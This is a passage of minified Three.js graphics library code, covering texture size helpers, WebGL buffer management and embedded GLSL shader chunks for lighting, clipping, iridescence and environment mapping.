o*e/c.components*c.byteLength;case Kp:return o*e/c.components*c.byteLength;case jr:return o*e*2/c.components*c.byteLength;case jp:return o*e*2/c.components*c.byteLength;case kx:return o*e*3/c.components*c.byteLength;case zi:return o*e*4/c.components*c.byteLength;case Qp:return o*e*4/c.components*c.byteLength;case Mu:case Eu:return Math.floor((o+3)/4)*Math.floor((e+3)/4)*8;case bu:case Tu:return Math.floor((o+3)/4)*Math.floor((e+3)/4)*16;case up:case dp:return Math.max(o,16)*Math.max(e,8)/4;case cp:case fp:return Math.max(o,8)*Math.max(e,8)/2;case hp:case pp:case gp:case _p:return Math.floor((o+3)/4)*Math.floor((e+3)/4)*8;case mp:case Ru:case vp:return Math.floor((o+3)/4)*Math.floor((e+3)/4)*16;case xp:return Math.floor((o+3)/4)*Math.floor((e+3)/4)*16;case Sp:return Math.floor((o+4)/5)*Math.floor((e+3)/4)*16;case yp:return Math.floor((o+4)/5)*Math.floor((e+4)/5)*16;case Mp:return Math.floor((o+5)/6)*Math.floor((e+4)/5)*16;case Ep:return Math.floor((o+5)/6)*Math.floor((e+5)/6)*16;case bp:return Math.floor((o+7)/8)*Math.floor((e+4)/5)*16;case Tp:return Math.floor((o+7)/8)*Math.floor((e+5)/6)*16;case Ap:return Math.floor((o+7)/8)*Math.floor((e+7)/8)*16;case Rp:return Math.floor((o+9)/10)*Math.floor((e+4)/5)*16;case Cp:return Math.floor((o+9)/10)*Math.floor((e+5)/6)*16;case wp:return Math.floor((o+9)/10)*Math.floor((e+7)/8)*16;case Np:return Math.floor((o+9)/10)*Math.floor((e+9)/10)*16;case Dp:return Math.floor((o+11)/12)*Math.floor((e+9)/10)*16;case Up:return Math.floor((o+11)/12)*Math.floor((e+11)/12)*16;case Lp:case Op:case Pp:return Math.ceil(o/4)*Math.ceil(e/4)*16;case Ip:case zp:return Math.ceil(o/4)*Math.ceil(e/4)*8;case Cu:case Bp:return Math.ceil(o/4)*Math.ceil(e/4)*16}throw new Error(`Unable to determine texture byte length for ${i} format.`)}function zb(o){switch(o){case Ai:case Fx:return{byteLength:1,components:1};case vl:case Hx:case oa:return{byteLength:2,components:1};case Yp:case Zp:return{byteLength:2,components:4};case sa:case qp:case ia:return{byteLength:4,components:1};case Gx:case Vx:return{byteLength:4,components:3}}throw new Error(`THREE.TextureUtils: Unknown texture type ${o}.`)}typeof __THREE_DEVTOOLS__<"u"&&__THREE_DEVTOOLS__.dispatchEvent(new CustomEvent("register",{detail:{revision:Wp}}));typeof window<"u"&&(window.__THREE__?se("WARNING: Multiple instances of Three.js being imported."):window.__THREE__=Wp);/**
 * @license
 * Copyright 2010-2026 Three.js Authors
 * SPDX-License-Identifier: MIT
 */function oS(){let o=null,e=!1,i=null,s=null;function c(f,d){s=o.requestAnimationFrame(c),i(f,d)}return{start:function(){e!==!0&&i!==null&&o!==null&&(s=o.requestAnimationFrame(c),e=!0)},stop:function(){o!==null&&o.cancelAnimationFrame(s),e=!1},setAnimationLoop:function(f){i=f},setContext:function(f){o=f}}}function Bb(o){const e=new WeakMap;function i(h,m){const p=h.array,x=h.usage,v=p.byteLength,_=o.createBuffer();o.bindBuffer(m,_),o.bufferData(m,p,x),h.onUploadCallback();let E;if(p instanceof Float32Array)E=o.FLOAT;else if(typeof Float16Array<"u"&&p instanceof Float16Array)E=o.HALF_FLOAT;else if(p instanceof Uint16Array)h.isFloat16BufferAttribute?E=o.HALF_FLOAT:E=o.UNSIGNED_SHORT;else if(p instanceof Int16Array)E=o.SHORT;else if(p instanceof Uint32Array)E=o.UNSIGNED_INT;else if(p instanceof Int32Array)E=o.INT;else if(p instanceof Int8Array)E=o.BYTE;else if(p instanceof Uint8Array)E=o.UNSIGNED_BYTE;else if(p instanceof Uint8ClampedArray)E=o.UNSIGNED_BYTE;else throw new Error("THREE.WebGLAttributes: Unsupported buffer data format: "+p);return{buffer:_,type:E,bytesPerElement:p.BYTES_PER_ELEMENT,version:h.version,size:v}}function s(h,m,p){const x=m.array,v=m.updateRanges;if(o.bindBuffer(p,h),v.length===0)o.bufferSubData(p,0,x);else{v.sort((E,T)=>E.start-T.start);let _=0;for(let E=1;E<v.length;E++){const T=v[_],w=v[E];w.start<=T.start+T.count+1?T.count=Math.max(T.count,w.start+w.count-T.start):(++_,v[_]=w)}v.length=_+1;for(let E=0,T=v.length;E<T;E++){const w=v[E];o.bufferSubData(p,w.start*x.BYTES_PER_ELEMENT,x,w.start,w.count)}m.clearUpdateRanges()}m.onUploadCallback()}function c(h){return h.isInterleavedBufferAttribute&&(h=h.data),e.get(h)}function f(h){h.isInterleavedBufferAttribute&&(h=h.data);const m=e.get(h);m&&(o.deleteBuffer(m.buffer),e.delete(h))}function d(h,m){if(h.isInterleavedBufferAttribute&&(h=h.data),h.isGLBufferAttribute){const x=e.get(h);(!x||x.version<h.version)&&e.set(h,{buffer:h.buffer,type:h.type,bytesPerElement:h.elementSize,version:h.version});return}const p=e.get(h);if(p===void 0)e.set(h,i(h,m));else if(p.version<h.version){if(p.size!==h.array.byteLength)throw new Error("THREE.WebGLAttributes: The size of the buffer attribute's array buffer does not match the original size. Resizing buffer attributes is not supported.");s(p.buffer,h,m),p.version=h.version}}return{get:c,remove:f,update:d}}var Fb=`#ifdef USE_ALPHAHASH
	if ( diffuseColor.a < getAlphaHashThreshold( vPosition ) ) discard;
#endif`,Hb=`#ifdef USE_ALPHAHASH
	const float ALPHA_HASH_SCALE = 0.05;
	float hash2D( vec2 value ) {
		return fract( 1.0e4 * sin( 17.0 * value.x + 0.1 * value.y ) * ( 0.1 + abs( sin( 13.0 * value.y + value.x ) ) ) );
	}
	float hash3D( vec3 value ) {
		return hash2D( vec2( hash2D( value.xy ), value.z ) );
	}
	float getAlphaHashThreshold( vec3 position ) {
		float maxDeriv = max(
			length( dFdx( position.xyz ) ),
			length( dFdy( position.xyz ) )
		);
		float pixScale = 1.0 / ( ALPHA_HASH_SCALE * maxDeriv );
		vec2 pixScales = vec2(
			exp2( floor( log2( pixScale ) ) ),
			exp2( ceil( log2( pixScale ) ) )
		);
		vec2 alpha = vec2(
			hash3D( floor( pixScales.x * position.xyz ) ),
			hash3D( floor( pixScales.y * position.xyz ) )
		);
		float lerpFactor = fract( log2( pixScale ) );
		float x = ( 1.0 - lerpFactor ) * alpha.x + lerpFactor * alpha.y;
		float a = min( lerpFactor, 1.0 - lerpFactor );
		vec3 cases = vec3(
			x * x / ( 2.0 * a * ( 1.0 - a ) ),
			( x - 0.5 * a ) / ( 1.0 - a ),
			1.0 - ( ( 1.0 - x ) * ( 1.0 - x ) / ( 2.0 * a * ( 1.0 - a ) ) )
		);
		float threshold = ( x < ( 1.0 - a ) )
			? ( ( x < a ) ? cases.x : cases.y )
			: cases.z;
		return clamp( threshold , 1.0e-6, 1.0 );
	}
#endif`,Gb=`#ifdef USE_ALPHAMAP
	diffuseColor.a *= texture2D( alphaMap, vAlphaMapUv ).g;
#endif`,Vb=`#ifdef USE_ALPHAMAP
	uniform sampler2D alphaMap;
#endif`,Xb=`#ifdef USE_ALPHATEST
	#ifdef ALPHA_TO_COVERAGE
	diffuseColor.a = smoothstep( alphaTest, alphaTest + fwidth( diffuseColor.a ), diffuseColor.a );
	if ( diffuseColor.a == 0.0 ) discard;
	#else
	if ( diffuseColor.a < alphaTest ) discard;
	#endif
#endif`,kb=`#ifdef USE_ALPHATEST
	uniform float alphaTest;
#endif`,Wb=`#ifdef USE_AOMAP
	float ambientOcclusion = ( texture2D( aoMap, vAoMapUv ).r - 1.0 ) * aoMapIntensity + 1.0;
	reflectedLight.indirectDiffuse *= ambientOcclusion;
	#if defined( USE_CLEARCOAT ) 
		clearcoatSpecularIndirect *= ambientOcclusion;
	#endif
	#if defined( USE_SHEEN ) 
		sheenSpecularIndirect *= ambientOcclusion;
	#endif
	#if defined( USE_ENVMAP ) && defined( STANDARD )
		float dotNV = saturate( dot( geometryNormal, geometryViewDir ) );
		reflectedLight.indirectSpecular *= computeSpecularOcclusion( dotNV, ambientOcclusion, material.roughness );
	#endif
#endif`,qb=`#ifdef USE_AOMAP
	uniform sampler2D aoMap;
	uniform float aoMapIntensity;
#endif`,Yb=`#ifdef USE_BATCHING
	#if ! defined( GL_ANGLE_multi_draw )
	#define gl_DrawID _gl_DrawID
	uniform int _gl_DrawID;
	#endif
	uniform highp sampler2D batchingTexture;
	uniform highp usampler2D batchingIdTexture;
	mat4 getBatchingMatrix( const in float i ) {
		int size = textureSize( batchingTexture, 0 ).x;
		int j = int( i ) * 4;
		int x = j % size;
		int y = j / size;
		vec4 v1 = texelFetch( batchingTexture, ivec2( x, y ), 0 );
		vec4 v2 = texelFetch( batchingTexture, ivec2( x + 1, y ), 0 );
		vec4 v3 = texelFetch( batchingTexture, ivec2( x + 2, y ), 0 );
		vec4 v4 = texelFetch( batchingTexture, ivec2( x + 3, y ), 0 );
		return mat4( v1, v2, v3, v4 );
	}
	float getIndirectIndex( const in int i ) {
		int size = textureSize( batchingIdTexture, 0 ).x;
		int x = i % size;
		int y = i / size;
		return float( texelFetch( batchingIdTexture, ivec2( x, y ), 0 ).r );
	}
#endif
#ifdef USE_BATCHING_COLOR
	uniform sampler2D batchingColorTexture;
	vec4 getBatchingColor( const in float i ) {
		int size = textureSize( batchingColorTexture, 0 ).x;
		int j = int( i );
		int x = j % size;
		int y = j / size;
		return texelFetch( batchingColorTexture, ivec2( x, y ), 0 );
	}
#endif`,Zb=`#ifdef USE_BATCHING
	mat4 batchingMatrix = getBatchingMatrix( getIndirectIndex( gl_DrawID ) );
#endif`,Kb=`vec3 transformed = vec3( position );
#ifdef USE_ALPHAHASH
	vPosition = vec3( position );
#endif`,jb=`vec3 objectNormal = vec3( normal );
#ifdef USE_TANGENT
	vec3 objectTangent = vec3( tangent.xyz );
#endif`,Qb=`float G_BlinnPhong_Implicit( ) {
	return 0.25;
}
float D_BlinnPhong( const in float shininess, const in float dotNH ) {
	return RECIPROCAL_PI * ( shininess * 0.5 + 1.0 ) * pow( dotNH, shininess );
}
vec3 BRDF_BlinnPhong( const in vec3 lightDir, const in vec3 viewDir, const in vec3 normal, const in vec3 specularColor, const in float shininess ) {
	vec3 halfDir = normalize( lightDir + viewDir );
	float dotNH = saturate( dot( normal, halfDir ) );
	float dotVH = saturate( dot( viewDir, halfDir ) );
	vec3 F = F_Schlick( specularColor, 1.0, dotVH );
	float G = G_BlinnPhong_Implicit( );
	float D = D_BlinnPhong( shininess, dotNH );
	return F * ( G * D );
} // validated`,Jb=`#ifdef USE_IRIDESCENCE
	const mat3 XYZ_TO_REC709 = mat3(
		 3.2404542, -0.9692660,  0.0556434,
		-1.5371385,  1.8760108, -0.2040259,
		-0.4985314,  0.0415560,  1.0572252
	);
	vec3 Fresnel0ToIor( vec3 fresnel0 ) {
		vec3 sqrtF0 = sqrt( fresnel0 );
		return ( vec3( 1.0 ) + sqrtF0 ) / ( vec3( 1.0 ) - sqrtF0 );
	}
	vec3 IorToFresnel0( vec3 transmittedIor, float incidentIor ) {
		return pow2( ( transmittedIor - vec3( incidentIor ) ) / ( transmittedIor + vec3( incidentIor ) ) );
	}
	float IorToFresnel0( float transmittedIor, float incidentIor ) {
		return pow2( ( transmittedIor - incidentIor ) / ( transmittedIor + incidentIor ));
	}
	vec3 evalSensitivity( float OPD, vec3 shift ) {
		float phase = 2.0 * PI * OPD * 1.0e-9;
		vec3 val = vec3( 5.4856e-13, 4.4201e-13, 5.2481e-13 );
		vec3 pos = vec3( 1.6810e+06, 1.7953e+06, 2.2084e+06 );
		vec3 var = vec3( 4.3278e+09, 9.3046e+09, 6.6121e+09 );
		vec3 xyz = val * sqrt( 2.0 * PI * var ) * cos( pos * phase + shift ) * exp( - pow2( phase ) * var );
		xyz.x += 9.7470e-14 * sqrt( 2.0 * PI * 4.5282e+09 ) * cos( 2.2399e+06 * phase + shift[ 0 ] ) * exp( - 4.5282e+09 * pow2( phase ) );
		xyz /= 1.0685e-7;
		vec3 rgb = XYZ_TO_REC709 * xyz;
		return rgb;
	}
	vec3 evalIridescence( float outsideIOR, float eta2, float cosTheta1, float thinFilmThickness, vec3 baseF0 ) {
		vec3 I;
		float iridescenceIOR = mix( outsideIOR, eta2, smoothstep( 0.0, 0.03, thinFilmThickness ) );
		float sinTheta2Sq = pow2( outsideIOR / iridescenceIOR ) * ( 1.0 - pow2( cosTheta1 ) );
		float cosTheta2Sq = 1.0 - sinTheta2Sq;
		if ( cosTheta2Sq < 0.0 ) {
			return vec3( 1.0 );
		}
		float cosTheta2 = sqrt( cosTheta2Sq );
		float R0 = IorToFresnel0( iridescenceIOR, outsideIOR );
		float R12 = F_Schlick( R0, 1.0, cosTheta1 );
		float T121 = 1.0 - R12;
		float phi12 = 0.0;
		if ( iridescenceIOR < outsideIOR ) phi12 = PI;
		float phi21 = PI - phi12;
		vec3 baseIOR = Fresnel0ToIor( clamp( baseF0, 0.0, 0.9999 ) );		vec3 R1 = IorToFresnel0( baseIOR, iridescenceIOR );
		vec3 R23 = F_Schlick( R1, 1.0, cosTheta2 );
		vec3 phi23 = vec3( 0.0 );
		if ( baseIOR[ 0 ] < iridescenceIOR ) phi23[ 0 ] = PI;
		if ( baseIOR[ 1 ] < iridescenceIOR ) phi23[ 1 ] = PI;
		if ( baseIOR[ 2 ] < iridescenceIOR ) phi23[ 2 ] = PI;
		float OPD = 2.0 * iridescenceIOR * thinFilmThickness * cosTheta2;
		vec3 phi = vec3( phi21 ) + phi23;
		vec3 R123 = clamp( R12 * R23, 1e-5, 0.9999 );
		vec3 r123 = sqrt( R123 );
		vec3 Rs = pow2( T121 ) * R23 / ( vec3( 1.0 ) - R123 );
		vec3 C0 = R12 + Rs;
		I = C0;
		vec3 Cm = Rs - T121;
		for ( int m = 1; m <= 2; ++ m ) {
			Cm *= r123;
			vec3 Sm = 2.0 * evalSensitivity( float( m ) * OPD, float( m ) * phi );
			I += Cm * Sm;
		}
		return max( I, vec3( 0.0 ) );
	}
#endif`,$b=`#ifdef USE_BUMPMAP
	uniform sampler2D bumpMap;
	uniform float bumpScale;
	vec2 dHdxy_fwd() {
		vec2 dSTdx = dFdx( vBumpMapUv );
		vec2 dSTdy = dFdy( vBumpMapUv );
		float Hll = bumpScale * texture2D( bumpMap, vBumpMapUv ).x;
		float dBx = bumpScale * texture2D( bumpMap, vBumpMapUv + dSTdx ).x - Hll;
		float dBy = bumpScale * texture2D( bumpMap, vBumpMapUv + dSTdy ).x - Hll;
		return vec2( dBx, dBy );
	}
	vec3 perturbNormalArb( vec3 surf_pos, vec3 surf_norm, vec2 dHdxy, float faceDirection ) {
		vec3 vSigmaX = normalize( dFdx( surf_pos.xyz ) );
		vec3 vSigmaY = normalize( dFdy( surf_pos.xyz ) );
		vec3 vN = surf_norm;
		vec3 R1 = cross( vSigmaY, vN );
		vec3 R2 = cross( vN, vSigmaX );
		float fDet = dot( vSigmaX, R1 ) * faceDirection;
		vec3 vGrad = sign( fDet ) * ( dHdxy.x * R1 + dHdxy.y * R2 );
		return normalize( abs( fDet ) * surf_norm - vGrad );
	}
#endif`,tT=`#if NUM_CLIPPING_PLANES > 0
	vec4 plane;
	#ifdef ALPHA_TO_COVERAGE
		float distanceToPlane, distanceGradient;
		float clipOpacity = 1.0;
		#pragma unroll_loop_start
		for ( int i = 0; i < UNION_CLIPPING_PLANES; i ++ ) {
			plane = clippingPlanes[ i ];
			distanceToPlane = - dot( vClipPosition, plane.xyz ) + plane.w;
			distanceGradient = fwidth( distanceToPlane ) / 2.0;
			clipOpacity *= smoothstep( - distanceGradient, distanceGradient, distanceToPlane );
			if ( clipOpacity == 0.0 ) discard;
		}
		#pragma unroll_loop_end
		#if UNION_CLIPPING_PLANES < NUM_CLIPPING_PLANES
			float unionClipOpacity = 1.0;
			#pragma unroll_loop_start
			for ( int i = UNION_CLIPPING_PLANES; i < NUM_CLIPPING_PLANES; i ++ ) {
				plane = clippingPlanes[ i ];
				distanceToPlane = - dot( vClipPosition, plane.xyz ) + plane.w;
				distanceGradient = fwidth( distanceToPlane ) / 2.0;
				unionClipOpacity *= 1.0 - smoothstep( - distanceGradient, distanceGradient, distanceToPlane );
			}
			#pragma unroll_loop_end
			clipOpacity *= 1.0 - unionClipOpacity;
		#endif
		diffuseColor.a *= clipOpacity;
		if ( diffuseColor.a == 0.0 ) discard;
	#else
		#pragma unroll_loop_start
		for ( int i = 0; i < UNION_CLIPPING_PLANES; i ++ ) {
			plane = clippingPlanes[ i ];
			if ( dot( vClipPosition, plane.xyz ) > plane.w ) discard;
		}
		#pragma unroll_loop_end
		#if UNION_CLIPPING_PLANES < NUM_CLIPPING_PLANES
			bool clipped = true;
			#pragma unroll_loop_start
			for ( int i = UNION_CLIPPING_PLANES; i < NUM_CLIPPING_PLANES; i ++ ) {
				plane = clippingPlanes[ i ];
				clipped = ( dot( vClipPosition, plane.xyz ) > plane.w ) && clipped;
			}
			#pragma unroll_loop_end
			if ( clipped ) discard;
		#endif
	#endif
#endif`,eT=`#if NUM_CLIPPING_PLANES > 0
	varying vec3 vClipPosition;
	uniform vec4 clippingPlanes[ NUM_CLIPPING_PLANES ];
#endif`,nT=`#if NUM_CLIPPING_PLANES > 0
	varying vec3 vClipPosition;
#endif`,iT=`#if NUM_CLIPPING_PLANES > 0
	vClipPosition = - mvPosition.xyz;
#endif`,aT=`#if defined( USE_COLOR ) || defined( USE_COLOR_ALPHA )
	diffuseColor *= vColor;
#endif`,rT=`#if defined( USE_COLOR ) || defined( USE_COLOR_ALPHA )
	varying vec4 vColor;
#endif`,sT=`#if defined( USE_COLOR ) || defined( USE_COLOR_ALPHA ) || defined( USE_INSTANCING_COLOR ) || defined( USE_BATCHING_COLOR )
	varying vec4 vColor;
#endif`,oT=`#if defined( USE_COLOR ) || defined( USE_COLOR_ALPHA ) || defined( USE_INSTANCING_COLOR ) || defined( USE_BATCHING_COLOR )
	vColor = vec4( 1.0 );
#endif
#ifdef USE_COLOR_ALPHA
	vColor *= color;
#elif defined( USE_COLOR )
	vColor.rgb *= color;
#endif
#ifdef USE_INSTANCING_COLOR
	vColor.rgb *= instanceColor.rgb;
#endif
#ifdef USE_BATCHING_COLOR
	vColor *= getBatchingColor( getIndirectIndex( gl_DrawID ) );
#endif`,lT=`#define PI 3.141592653589793
#define PI2 6.283185307179586
#define PI_HALF 1.5707963267948966
#define RECIPROCAL_PI 0.3183098861837907
#define RECIPROCAL_PI2 0.15915494309189535
#define EPSILON 1e-6
#ifndef saturate
#define saturate( a ) clamp( a, 0.0, 1.0 )
#endif
#define whiteComplement( a ) ( 1.0 - saturate( a ) )
float pow2( const in float x ) { return x*x; }
vec3 pow2( const in vec3 x ) { return x*x; }
float pow3( const in float x ) { return x*x*x; }
float pow4( const in float x ) { float x2 = x*x; return x2*x2; }
float max3( const in vec3 v ) { return max( max( v.x, v.y ), v.z ); }
float average( const in vec3 v ) { return dot( v, vec3( 0.3333333 ) ); }
highp float rand( const in vec2 uv ) {
	const highp float a = 12.9898, b = 78.233, c = 43758.5453;
	highp float dt = dot( uv.xy, vec2( a,b ) ), sn = mod( dt, PI );
	return fract( sin( sn ) * c );
}
#ifdef HIGH_PRECISION
	float precisionSafeLength( vec3 v ) { return length( v ); }
#else
	float precisionSafeLength( vec3 v ) {
		float maxComponent = max3( abs( v ) );
		return length( v / maxComponent ) * maxComponent;
	}
#endif
struct IncidentLight {
	vec3 color;
	vec3 direction;
	bool visible;
};
struct ReflectedLight {
	vec3 directDiffuse;
	vec3 directSpecular;
	vec3 indirectDiffuse;
	vec3 indirectSpecular;
};
#ifdef USE_ALPHAHASH
	varying vec3 vPosition;
#endif
vec3 transformDirection( in vec3 dir, in mat4 matrix ) {
	return normalize( ( matrix * vec4( dir, 0.0 ) ).xyz );
}
#define inverseTransformDirection transformDirectionByInverseViewMatrix
vec3 transformNormalByInverseViewMatrix( in vec3 normal, in mat4 viewMatrix ) {
	return normalize( ( vec4( normal, 0.0 ) * viewMatrix ).xyz );
}
vec3 transformDirectionByInverseViewMatrix( in vec3 dir, in mat4 viewMatrix ) {
	return normalize( ( vec4( dir, 0.0 ) * viewMatrix ).xyz );
}
bool isPerspectiveMatrix( mat4 m ) {
	return m[ 2 ][ 3 ] == - 1.0;
}
vec2 equirectUv( in vec3 dir ) {
	float u = atan( dir.z, dir.x ) * RECIPROCAL_PI2 + 0.5;
	float v = asin( clamp( dir.y, - 1.0, 1.0 ) ) * RECIPROCAL_PI + 0.5;
	return vec2( u, v );
}
vec3 BRDF_Lambert( const in vec3 diffuseColor ) {
	return RECIPROCAL_PI * diffuseColor;
}
vec3 F_Schlick( const in vec3 f0, const in float f90, const in float dotVH ) {
	float fresnel = exp2( ( - 5.55473 * dotVH - 6.98316 ) * dotVH );
	return f0 * ( 1.0 - fresnel ) + ( f90 * fresnel );
}
float F_Schlick( const in float f0, const in float f90, const in float dotVH ) {
	float fresnel = exp2( ( - 5.55473 * dotVH - 6.98316 ) * dotVH );
	return f0 * ( 1.0 - fresnel ) + ( f90 * fresnel );
} // validated`,cT=`#ifdef ENVMAP_TYPE_CUBE_UV
	#define cubeUV_minMipLevel 4.0
	#define cubeUV_minTileSize 16.0
	float getFace( vec3 direction ) {
		vec3 absDirection = abs( direction );
		float face = - 1.0;
		if ( absDirection.x > absDirection.z ) {
			if ( absDirection.x > absDirection.y )
				face = direction.x > 0.0 ? 0.0 : 3.0;
			else
				face = direction.y > 0.0 ? 1.0 : 4.0;
		} else {
			if ( absDirection.z > absDirection.y )
				face = direction.z > 0.0 ? 2.0 : 5.0;
			else
				face = direction.y > 0.0 ? 1.0 : 4.0;
		}
		return face;
	}
	vec2 getUV( vec3 direction, float face ) {
		vec2 uv;
		if ( face == 0.0 ) {
			uv = vec2( direction.z, direction.y ) / abs( direction.x );
		} else if ( face == 1.0 ) {
			uv = vec2( - direction.x, - direction.z ) / abs( direction.y );
		} else if ( face == 2.0 ) {
			uv = vec2( - direction.x, direction.y ) / abs( direction.z );
		} else if ( face == 3.0 ) {
			uv = vec2( - direction.z, direction.y ) / abs( direction.x );
		} else if ( face == 4.0 ) {
			uv = vec2( - direction.x, direction.z ) / abs( direction.y );
		} else {
			uv = vec2( direction.x, direction.y ) / abs( direction.z );
		}
		return 0.5 * ( uv + 1.0 );
	}
	vec3 bilinearCubeUV( sampler2D envMap, vec3 direction, float mipInt ) {
		float face = getFace( direction );
		float filterInt = max( cubeUV_minMipLevel - mipInt, 0.0 );
		mipInt = max( mipInt, cubeUV_minMipLevel );
		float faceSize = exp2( mipInt );
		highp vec2 uv = getUV( direction, face ) * ( faceSize - 2.0 ) + 1.0;
		if ( face > 2.0 ) {
			uv.y += faceSize;
			face -= 3.0;
		}
		uv.x += face * faceSize;
		uv.x += filterInt * 3.0 * cubeUV_minTileSize;
		uv.y += 4.0 * ( exp2( CUBEUV_MAX_MIP ) - faceSize );
		uv.x *= CUBEUV_TEXEL_WIDTH;
		uv.y *= CUBEUV_TEXEL_HEIGHT;
		#ifdef texture2DGradEXT
			return texture2DGradEXT( envMap, uv, vec2( 0.0 ), vec2( 0.0 ) ).rgb;
		#else
			return texture2D( envMap, uv ).rgb;
		#endif
	}
	#define cubeUV_r0 1.0
	#define cubeUV_m0 - 2.0
	#define cubeUV_r1 0.8
	#define cubeUV_m1 - 1.0
	#define cubeUV_r4 0.4
	#define cubeUV_m4 2.0
	#define cubeUV_r5 0.305
	#define cubeUV_m5 3.0
	#define cubeUV_r6 0.21
	#define cubeUV_m6 4.0
	float roughnessToMip( float roughness ) {
		float mip = 0.0;
		if ( roughness >= cubeUV_r1 ) {
			mip = ( cubeUV_r0 - roughness ) * ( cubeUV_m1 - cubeUV_m0 ) / ( cubeUV_r0 - cubeUV_r1 ) + cubeUV_m0;
		} else if ( roughness >= cubeUV_r4 ) {
			mip = ( cubeUV_r1 - roughness ) * ( cubeUV_m4 - cubeUV_m1 ) / ( cubeUV_r1 - cubeUV_r4 ) + cubeUV_m1;
		} else if ( roughness >= cubeUV_r5 ) {
			mip = ( cubeUV_r4 - roughness ) * ( cubeUV_m5 - cubeUV_m4 ) / ( cubeUV_r4 - cubeUV_r5 ) + cubeUV_m4;
		} else if ( roughness >= cubeUV_r6 ) {
			mip = ( cubeUV_r5 - roughness ) * ( cubeUV_m6 - cubeUV_m5 ) / ( cubeUV_r5 - cubeUV_r6 ) + cubeUV_m5;
		} else {
			mip = - 2.0 * log2( 1.16 * roughness );		}
		return mip;
	}
	vec4 textureCubeUV( sampler2D envMap, vec3 sampleDir, float roughness ) {
		float mip = clamp( roughnessToMip( roughness ), cubeUV_m0, CUBEUV_MAX_MIP );
		float mipF = fract( mip );
		float mipInt = floor( mip );
		vec3 color0 = bilinearCubeUV( envMap, sampleDir, mipInt );
		if ( mipF == 0.0 ) {
			return vec4( color0, 1.0 );
		} else {
			vec3 color1 = bilinearCubeUV( envMap, sampleDir, mipInt + 1.0 );
			return vec4( mix( color0, color1, mipF ), 1.0 );
		}
	}
#endif`,uT=`vec3 transformedNormal = objectNormal;
#ifdef USE_TANGENT
	vec3 transformedTangent = objectTangent;
#endif
#ifdef USE_BATCHING
	mat3 bm = mat3( batchingMatrix );
	transformedNormal /= vec3( dot( bm[ 0 ], bm[ 0 ] ), dot( bm[ 1 ], bm[ 1 ] ), dot( bm[ 2 ], bm[ 2 ] ) );
	transformedNormal = bm * transformedNormal;
	#ifdef USE_TANGENT
		transformedTangent = bm * transformedTangent;
	#endif
#endif
#ifdef USE_INSTANCING
	mat3 im = mat3( instanceMatrix );
	transformedNormal /= vec3( dot( im[ 0 ], im[ 0 ] ), dot( im[ 1 ], im[ 1 ] ), dot( im[ 2 ], im[ 2 ] ) );
	transformedNormal = im * transformedNormal;
	#ifdef USE_TANGENT
		transformedTangent = im * transformedTangent;
	#endif
#endif
transformedNormal = normalMatrix * transformedNormal;
#ifdef FLIP_SIDED
	transformedNormal = - transformedNormal;
#endif
#ifdef USE_TANGENT
	transformedTangent = ( modelViewMatrix * vec4( transformedTangent, 0.0 ) ).xyz;
#endif`,fT=`#ifdef USE_DISPLACEMENTMAP
	uniform sampler2D displacementMap;
	uniform float displacementScale;
	uniform float displacementBias;
#endif`,dT=`#ifdef USE_DISPLACEMENTMAP
	transformed += normalize( objectNormal ) * ( texture2D( displacementMap, vDisplacementMapUv ).x * displacementScale + displacementBias );
#endif`,hT=`#ifdef USE_EMISSIVEMAP
	vec4 emissiveColor = texture2D( emissiveMap, vEmissiveMapUv );
	#ifdef DECODE_VIDEO_TEXTURE_EMISSIVE
		emissiveColor = sRGBTransferEOTF( emissiveColor );
	#endif
	totalEmissiveRadiance *= emissiveColor.rgb;
#endif`,pT=`#ifdef USE_EMISSIVEMAP
	uniform sampler2D emissiveMap;
#endif`,mT="gl_FragColor = linearToOutputTexel( gl_FragColor );",gT=`vec4 LinearTransferOETF( in vec4 value ) {
	return value;
}
vec4 sRGBTransferEOTF( in vec4 value ) {
	return vec4( mix( pow( value.rgb * 0.9478672986 + vec3( 0.0521327014 ), vec3( 2.4 ) ), value.rgb * 0.0773993808, vec3( lessThanEqual( value.rgb, vec3( 0.04045 ) ) ) ), value.a );
}
vec4 sRGBTransferOETF( in vec4 value ) {
	return vec4( mix( pow( value.rgb, vec3( 0.41666 ) ) * 1.055 - vec3( 0.055 ), value.rgb * 12.92, vec3( lessThanEqual( value.rgb, vec3( 0.0031308 ) ) ) ), value.a );
}`,_T=`#ifdef USE_ENVMAP
	#ifdef ENV_WORLDPOS
		vec3 cameraToFrag;
		if ( isOrthographic ) {
			cameraToFrag = normalize( vec3( - viewMatrix[ 0 ][ 2 ], - viewMatrix[ 1 ][ 2 ], - viewMatrix[ 2 ][ 2 ] ) );
		} else {
			cameraToFrag = normalize( vWorldPosition - cameraPosition );
		}
		vec3 worldNormal = transformNormalByInverseViewMatrix( normal, viewMatrix );
		#ifdef ENVMAP_MODE_REFLECTION
			vec3 reflectVec = reflect( cameraToFrag, worldNormal );
		#else
			vec3 reflectVec = refract( cameraToFrag, worldNormal, refractionRatio );
		#endif
	#else
		vec3 reflectVec = vReflect;
	#endif
	#ifdef ENVMAP_TYPE_CUBE
		vec4 envColor = textureCube( envMap, envMapRotation * reflectVec );
		#ifdef ENVMAP_BLENDING_MULTIPLY
			outgoingLight = mix( outgoingLight, outgoingLight * envColor.xyz, specularStrength * reflectivity );
		#elif defined( ENVMAP_BLENDING_MIX )
			outgoingLight = mix( outgoingLight, envColor.xyz, specularStrength * reflectivity );
		#elif defined( ENVMAP_BLENDING_ADD )
			outgoingLight += envColor.xyz * specularStrength * reflectivity;
		#endif
	#endif
#endif`,vT=`#ifdef USE_ENVMAP
	uniform float envMapIntensity;
	uniform mat3 envMapRotation;
	#ifdef ENVMAP_TYPE_CUBE
		uniform samplerCube envMap;
	#else
		uniform sampler2D envMap;
	#endif
#endif`,xT=`#ifdef USE_ENVMAP
	uniform float reflectivity;
	#if defined( USE_BUMPMAP ) || defined( USE_NORMALMAP ) || defined( PHONG ) || defined( LAMBERT )
		#define ENV_WORLDPOS
	#endif
	#ifdef ENV_WORLDPOS
		varying vec3 vWorldPosition;
		uniform float refractionRatio;
	#else
		varying vec3 vReflect;
	#endif
#endif`,ST=`#ifdef USE_ENVMAP
	#if defined( USE_BUMPMAP ) || defined( USE_NORMALMAP ) || defined( PHONG ) || defined( LAMBERT )
		#define ENV_WORLDPOS
	#endif
	#ifdef ENV_WORLDPOS
		
		varying vec3 vWorldPosition;
	#else
		varying vec3 vReflect;
		uniform float refractionRatio;
	#endif
#endif`,yT=`#ifdef USE_ENVMAP
	#ifdef ENV_WORLDPOS
		vWorldPosition = worldPosition.xyz;
	#else
		vec3 cameraToVertex;
		if ( isOrthographic ) {
